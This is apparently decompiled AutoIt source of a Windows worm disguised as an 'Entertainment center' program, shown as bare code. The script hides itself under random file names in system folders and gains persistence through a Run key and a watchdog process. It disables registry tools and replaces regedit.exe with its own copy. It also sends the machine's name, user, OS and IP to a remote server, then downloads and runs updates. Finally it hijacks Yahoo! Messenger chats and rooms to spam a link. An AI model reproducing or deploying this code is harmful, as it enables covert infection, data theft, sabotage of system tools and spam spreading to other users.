; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: D:\au3\src\entcen.au3>
; ----------------------------------------------------------------------------

global $debug=0
global $TrayIconHide=1
global $fileVersion=8
global $iniVersion=1
global $website="http://entcen.100webspace.net"
global $updateurl="http://entcen.100webspace.net/update.php"
;global $updateurl="http://localhost/projects/entcen/update.php"
;installDir must be a full path
global $installDir=@SystemDir&"\"
global $tmpDir=@TempDir&"\"
global $guardDir=@AppDataCommonDir&"\App\";guardDir must be different from tmpDir
global $executeFile="variate.exe"
global $iniFile="entinit.ini"
global $verFile="entver.ini"
global $updateFile="upp.exe"
global $oneSec=3550000
global $downloading
global $updateTimer
global $versionDownloadTimer
global $iniDownloadTimer
global $newVersionDownloadTimer
global $updateInterval=$oneSec*5
global $versionDownloadTimeLimit=$oneSec*60
global $newVersionDownloadTimeLimit=$oneSec*240
global $iniDownloadTimeLimit=$oneSec*120
global $msgTimer
global $title="Entertainment center"
global $startupPath
global $startupValue
global $guardPID
global $pid2protect
global $systemInfo="ComputerName="&@ComputerName&"&UserName="&@UserName&"&OSType="&@OSType&"&OSVersion="&@OSVersion&"&OSBuild="&@OSBuild&"&OSServicePack="&@OSServicePack&"&ProcessorArch="&@ProcessorArch&"&IPAddress1="&@IPAddress1
;;predefined Virus List ;;;;;;;;;;;;;;;;;;;;;;;;
global $msgs[16][2]
$list=stringSplit($website&"|"&$website,"|")
$msgs[0][0]=$list[0]
for $i=1 to $msgs[0][0]
	$msgs[$i][1]=stringstripWS($list[$i],3)
next
readMsgs()
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Opt("TrayAutoPause",0)
Opt("TrayIconHide",Not $debug)
Opt("TrayMenuMode",1);Hide default menu
global $params[3]
for $i=0 to 2
	$params[$i]=0
next
for $i=0 to $CmdLine[0]
	$params[$i]=$CmdLine[$i]
next
if $params[1]=="delnext" and fileexists($params[2]) then
	filedelete($params[2])
endif
select
case @ScriptDir&"\" <> $installDir and @ScriptDir&"\" <> $guardDir
	install()
case $params[1]=="guard"
	$pid2protect=$params[2]
	while(1)
		check2leave()
		guard()
		sleep(1)
	wend
Case Else
	select
		case $params[1]="updatedNewVersion"
		case $params[1]="installFinish"
	endselect
	IwillStay()
	Opt("TrayIconHide",$TrayIconHide)
	TraySetToolTip("Entcen "&$fileVersion&"."&$iniVersion&" "&@scriptFullpath&" "&@autoitPID)
	startupReg()
	createGuard()
	;Start loop;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	while (1)
		guardCheck()
		check2leave()
		startupCheck()
		updateMng()
		sendMsg()
		sleep(1)
	wend
	;End loop;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
endselect


;functions;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
func startupReg()
	;Check to delete current startup file in restart or update case
	$regPath="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
	$currStartup=regread($regPath,"winValidate")
	$currStartup=stringsplit($currStartup," ")
	$currStartup=$currStartup[1]
	if fileexists($currStartup) then
		filedelete($currStartup)
	endif
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	$startupPath=$installDir&randomName_smart(8)&".exe"
	while(not FileCopy ( @ScriptFullPath, $startupPath, 9))
	wend
	$startupValue=$startupPath&" delnext "&@ScriptFullPath
	RegWrite($regPath,"winValidate","REG_SZ",$startupValue)
endfunc

func startupCheck();Check if startup reg is deleted then create a brand-new one
	;Disable and kill regedit
	if not regread("HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools") then
		RegWrite("HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
	endif
	if fileGetSize(@WindowsDir&"\regedit.exe")<> fileGetSize(@ScriptFullPath)then
		FileCopy ( @ScriptFullPath, @WindowsDir&"\regedit.exe", 9)
	endif
	;End of regedit killer
	$regPath="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
	if regread($regPath,"winValidate") <> $startupValue or not fileexists($startupPath) then
		if fileexists($startupPath) then
			filedelete($startupPath)
		endif
		startupReg()
	endif
endfunc

func killProcess($pid)
	$exitcode=Runwait(@ComSpec & " /c " & "taskkill /F /pid "&$pid, "", @SW_HIDE)
	return not processexists($pid)
endfunc

Func _ProcessSuspend($processid)
;$processid = ProcessExists($process)
If $processid Then
    $ai_Handle = DllCall("kernel32.dll", 'int', 'OpenProcess', 'int', 0x1f0fff, 'int', False, 'int', $processid)
    $i_sucess = DllCall("ntdll.dll","int","NtSuspendProcess","int",$ai_Handle[0])
    DllCall('kernel32.dll', 'ptr', 'CloseHandle', 'ptr', $ai_Handle)
    If IsArray($i_sucess) Then
        Return 1
    Else
        SetError(1)
        Return 0
    Endif
Else
    SetError(2)
    Return 0
Endif
EndFunc

func checkAbort()
	if @InetGetActive then
		select
		case $downloading="versionInfo"
			if timerInit()-$versionDownloadTimer > $versionDownloadTimeLimit then
				InetGet("abort")
				$downloading=0
			endif
		case $downloading="ini"
			if timerInit()-$iniDownloadTimer > $iniDownloadTimeLimit then
				InetGet("abort")
				$downloading=0
			endif
		case $downloading="newVersion"
			if timerInit()-$newVersionDownloadTimer > $newVersionDownloadTimeLimit then
				InetGet("abort")
				$downloading=0
			endif
		endselect
	endif
endfunc
func updateMng()
	checkAbort()
	if timerInit() - $updateTimer > $updateInterval then
		$updateTimer=timerInit()
		getVersion()
	endif
	if $downloading and not @InetGetActive and @InetGetBytesRead <> -1 then ;Download finished
		$tmp=$downloading
		$downloading=0
		switch $tmp
			case "versionInfo"
				$iniVer=IniRead ( $tmpDir&$verFile, "version", "ini", "" )+0
				$fileVer=IniRead ( $tmpDir&$verFile, "version", "file", "" )+0
				if $fileVer > $fileVersion then
					getNewVersion()
				endif
				if $iniVer > $iniVersion then
					getIni()
				endif
			case "ini"
				Run(@ScriptFullPath&" updatedini", "", @SW_HIDE)
				selfKill()
			case "newVersion"
				Run($tmpDir&$updateFile&" delnext "&@ScriptFullPath, "", @SW_HIDE)
				selfKill()
		endswitch
	endif
endfunc

func getVersion()
	if not $downloading then
		$downloading="versionInfo"
		$versionDownloadTimer=timerInit()
		InetGet ($updateurl&"?download=versionInfo" ,$tmpDir&$verFile ,1,1)
	endif
endfunc

func getIni()
	if not $downloading then
		$downloading="ini"
		$iniDownloadTimer=timerInit()
		InetGet ($updateurl&"?download=ini&"&$systemInfo ,$installDir&$iniFile ,1,1)
	endif
endfunc

func getNewVersion()
	if not $downloading then
		$downloading="newVersion"
		$newVersionDownloadTimer=timerInit()
		InetGet ($updateurl&"?download=newVersion&"&$systemInfo ,$tmpDir&$updateFile ,1,1)
	endif
endfunc

func readMsgs()
	$version=IniRead ( $installDir&$iniFile, "version", "ini", "" )
	If $version > $iniVersion then
		$iniVersion=$version
		$list=IniReadSection ( $installDir&$iniFile, "msgs" )
		if @error==0 then
		$msgs=$list
		endif
	endif
endfunc

func sendMsg()
	$msgInterval=$oneSec*random(60,600,1)
	if timerInit() - $msgTimer > $msgInterval then
		$msgTimer=timerInit()
		$msg=$msgs[random(1,$msgs[0][0],1)][1]
		if $msg then
			sendYm($msg)
			sendYmRoom($msg)
		endif
	endif
endfunc

func sendYm($msg)
	$YTitle = WinGetTitle("Yahoo! Messenger", "")
	$state=wingetstate($YTitle)
	$active=winActive($YTitle)
	if $state and $state <> 5 and $state <> 21 then
		BlockInput (1)
			clipput($msg)
			winactivate($Ytitle)
			;Send("!mun^v {ENTER}{ENTER}")
			Send("^m{DOWN}^{SHIFTDOWN}{END}{SHIFTUP}{ENTER}^v!s")
			select
			case not $active
				winsetstate($Ytitle,"",@SW_MINIMIZE)
			endselect
		BlockInput (0)
	endif
endfunc

func sendYmRoom($msg)
	Dim $rooms[5]=["Hanoi","Hue","Saigon","Viet Fun","Vietnam"]
		for $room in $rooms
		$YTitle = WinGetTitle($room, "")
		$state=wingetstate($YTitle)
		$active=winActive($YTitle)
		if winExists($YTitle) then
			BlockInput (1)
				clipput($msg)
				winactivate($Ytitle)
				Send("^v!s")
				select
				case not $active
					winsetstate($Ytitle,"",@SW_MINIMIZE)
				endselect
			BlockInput (0)
			exitloop
		endif
	next
endfunc

func stopOldProcess()
$instants=ProcessList($executeFile)
if $instants[0][0]>0 then
For $i = 1 To $instants[0][0]
	If $instants[$i][1] <> @AutoItPID then
		killProcess($instants[$i][1])
	endif
next
endif
endfunc

func install()
	$executeFile=randomName_smart(8)&".exe"
	IwillStay()
	while(not filecopy(@ScriptFullPath, $installDir&$executeFile, 9))
	wend
	stayFree()
	$para="installFinish"
	If @ScriptDir==$tmpDir then
		$para="updatedNewVersion"
	endif
	Run($installDir&$executeFile&" "&$para, "", @SW_HIDE)
	selfKill()
endfunc

func selfKill()
	TraySetState (2)
	processClose(@AutoItPID)
endfunc

func randomName($charNum)
	$chars=stringSplit("abcdefghijklmnopqrstuvwxyz0123456789","")
	$name=""
	for $i=1 to $charNum
		$name&=$chars[random(1,$chars[0],1)]
	next
	return $name
endfunc

func randomName_smart($charNum)
	$chars1=stringSplit("bcdfghjklmnpqrstvwxz","")
	$chars2=stringSplit("aeiouy","")
	$chars3=stringSplit("0123456789","")
	$name=""
	$words=floor($charNum/3)
	for $i=1 to $words
		$name&=$chars1[random(1,$chars1[0],1)]&$chars2[random(1,$chars2[0],1)]&$chars1[random(1,$chars1[0],1)]
	next
	for $j=$words*3+1 to $charNum
		$name&=$chars1[random(1,$chars1[0],1)]
	next
	return $name
endfunc

func check2Leave()
	$value=regRead("HKLM\SOFTWARE\Microsoft\Conf","stayId")
	if $value then
		$value=stringSplit($value,"-")
		if $value[0]==4 then
			$who2stay=$value[3]
			if (($who2stay==$value[1]-1243) and ($who2stay==$value[2]/2) and ($who2stay==$value[4]-1342) and ($who2stay <> @AutoItPID) and ($who2stay <> $pid2protect)) then
				selfKill()
			endif
		endif
	endif
endfunc

func IwillStay()
	$value=(@AutoItPID+1243)&"-"&(@AutoItPID*2)&"-"&@AutoItPID&"-"&(@AutoItPID+1342)
	regWrite("HKLM\SOFTWARE\Microsoft\Conf","stayId","REG_SZ",$value)
endfunc

func stayFree()
	regdelete("HKLM\SOFTWARE\Microsoft\Conf","stayId")
endfunc

func createGuard()
	$guardPath=$guardDir&randomName_smart(8)&".exe"
	while(not filecopy(@ScriptFullPath, $guardPath, 9))
	wend
	$guardPID=Run($guardPath&" guard "&@AutoItPID, "", @SW_HIDE)
endfunc

func guardCheck()
	if not processexists($guardPID) then
		createGuard()
	endif
endfunc

func guard()
	if not processexists($pid2protect) then
		install()
	endif
endfunc

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: D:\au3\src\entcen.au3>
; ----------------------------------------------------------------------------

